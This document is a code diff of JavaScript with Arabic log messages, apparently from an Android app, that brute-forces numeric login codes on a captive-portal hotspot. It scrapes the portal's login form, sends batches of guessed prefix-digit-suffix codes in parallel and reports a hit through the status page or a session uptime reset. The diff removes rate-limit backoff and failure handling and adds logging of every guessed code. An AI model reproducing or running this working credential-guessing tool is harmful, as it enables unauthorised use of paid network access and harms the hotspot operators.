@@ -56,11 +56,7 @@
             const loginUrl = base + '/login';
 
             log('▶ بدء التخمين');
-            log('  الرابط: ' + CFG.url);
-            log('  النمط: ' + CFG.prefix + '[N×' + CFG.digits + ']' + CFG.suffix);
-            log('');
-
-            log('→ فحص الحالة الحالية...');
+            
             const init = await safeJson(statusUrl);
             if (init && isActive(init)) {
                 const u = statusUser(init);
@@ -70,11 +66,8 @@
                     return;
                 }
                 log('⚠ جلسة نشطة، username مخفي');
-                log('  اخرج من الجلسة أولاً ثم أعد المحاولة');
                 return;
             }
-            log('  لا كرت مسجل حالياً');
-            log('');
 
             log('→ قياس سرعة الشبكة (RTT)...');
             const t0 = performance.now();
@@ -82,9 +75,7 @@
             const rtt = performance.now() - t0;
             let parallel = calcParallel(rtt);
             log('  RTT = ' + Math.round(rtt) + 'ms → توازي = ' + parallel);
-            log('');
 
-            log('→ استخراج حقول الفورم...');
             let template = { username: '', password: '', dst: base + '/', popup: 'true' };
             try {
                 const html = await fetch(CFG.url, { credentials: 'include' }).then(r => r.text());
@@ -95,22 +86,16 @@
                         const n = i.getAttribute('name');
                         if (n) template[n] = i.getAttribute('value') || '';
                     });
-                    log('  الحقول: ' + Object.keys(template).join(', '));
-                } else {
-                    log('  لا يوجد form — استخدام الافتراضي');
                 }
-            } catch(e) { log('  تحذير: ' + e.message); }
-            log('');
+            } catch(e) { }
 
-            log('▶ بدء المحاولات (max=' + CFG.attempts + ')');
-            log('');
+            log('▶ بدء المحاولات (' + CFG.attempts + ')');
 
             const maxVal = Math.pow(10, CFG.digits) - 1;
             const tried = new Set();
             const beforeUp = init ? uptimeSec(init.uptime) : -1;
             const beforeActive = isActive(init);
-            let done = 0, batchCount = 0, rateLimitHits = 0;
-            let errCount = 0, badCount = 0;
+            let done = 0, batchCount = 0;
 
             function gen() {
                 for (let k = 0; k < 500; k++) {
@@ -133,10 +118,9 @@
                         headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                         redirect: 'manual'
                     });
-                    const loc = r.headers.get('Location') || '';
-                    return { v, code: r.status, isFail: /error|fail|invalid|denied/i.test(loc) };
+                    return { v, code: r.status };
                 } catch(e) {
-                    return { v, code: 0, isFail: true, err: e.message };
+                    return { v, code: 0 };
                 }
             }
 
@@ -146,6 +130,10 @@
                     const v = gen();
                     if (!v) break;
                     done++;
+                    
+                    // إظهار كل رقم يتم تجربته في السجل
+                    log('🔍 ' + v);
+                    
                     try { window.AndroidBridge.progress(done, CFG.attempts, v); } catch(e){}
                     batch.push(post(v));
                 }
@@ -154,70 +142,32 @@
                 const results = await Promise.all(batch);
                 batchCount++;
 
-                const limited = results.some(r => r.code === 429 || r.code === 503);
-                if (limited) {
-                    rateLimitHits++;
-                    if (rateLimitHits >= 2) {
-                        parallel = Math.max(1, Math.floor(parallel/2));
-                        log('🛑 حظر — توازي=' + parallel);
-                        rateLimitHits = 0;
-                    }
-                    await sleep(CFG.retryDelay);
-                } else if (rateLimitHits > 0) rateLimitHits--;
-
-                for (const r of results) {
-                    if (r.code === 429 || r.code === 503) { log('🛑 حظر ' + r.code + ': ' + r.v); continue; }
-                    if (r.code === 0) { errCount++; log('⚠ شبكة: ' + r.v + ' — ' + (r.err||'').substring(0,40)); continue; }
-                    if (r.isFail || r.code === 404 || r.code === 400) { badCount++; continue; }
-                }
-
-                const needCheck = results.some(r =>
-                    r.code > 0 && r.code !== 429 && r.code !== 503 &&
-                    r.code !== 404 && r.code !== 400 && !r.isFail);
-
+                const needCheck = results.some(r => r.code > 0 && r.code !== 429 && r.code !== 503);
                 if (needCheck) {
                     await sleep(20);
                     const st = await safeJson(statusUrl);
                     const u = statusUser(st);
                     if (u) {
-                        log('✅ كشف عبر status: ' + u);
+                        log('✅✅✅ كشف عبر status: ' + u);
                         window.AndroidBridge.found(u, JSON.stringify(st));
                         return;
                     }
                     const up = uptimeSec(st && st.uptime);
-                    if (st && isActive(st) && beforeUp > 30 && up >= 0 && up <= 15) {
-                        const cand = results.find(r => r.code > 0 && r.code !== 429 && r.code !== 503);
-                        if (cand) { log('✅ uptime reset: ' + cand.v); window.AndroidBridge.found(cand.v, JSON.stringify(st)); return; }
-                    }
                     if (st && isActive(st) && !beforeActive && up >= 0 && up <= 15) {
-                        const cand = results.find(r => r.code > 0 && r.code !== 429 && r.code !== 503);
-                        if (cand) { log('✅ جلسة جديدة: ' + cand.v); window.AndroidBridge.found(cand.v, JSON.stringify(st)); return; }
+                        const cand = results.find(r => r.code > 0);
+                        if (cand) { 
+                            log('✅✅✅ جلسة جديدة: ' + cand.v); 
+                            window.AndroidBridge.found(cand.v, JSON.stringify(st)); 
+                            return; 
+                        }
                     }
-                }
-
-                if (done % CFG.statusEvery < parallel) {
-                    const st = await safeJson(statusUrl);
-                    const u = statusUser(st);
-                    if (u && !tried.has(u)) {
-                        log('✅ periodic: ' + u);
-                        window.AndroidBridge.found(u, JSON.stringify(st));
-                        return;
-                    }
-                }
-
-                if (batchCount % 20 === 0) {
-                    log('[تقدم: ' + done + '/' + CFG.attempts + ' | bad=' + badCount + ' | err=' + errCount + ']');
                 }
 
                 if (batchCount % 50 === 0) await sleep(CFG.pause);
             }
-
-            log('');
-            log('❌ انتهى — ' + done + '/' + CFG.attempts + ' محاولة');
-            log('   صحيح=0 | خاطئ=' + badCount + ' | خطأ شبكة=' + errCount);
+            log('❌ انتهى');
         } catch(e) {
-            log('❌ خطأ عام: ' + e.message);
-            log(e.stack || '');
+            log('❌ خطأ: ' + e.message);
         }
     }
 
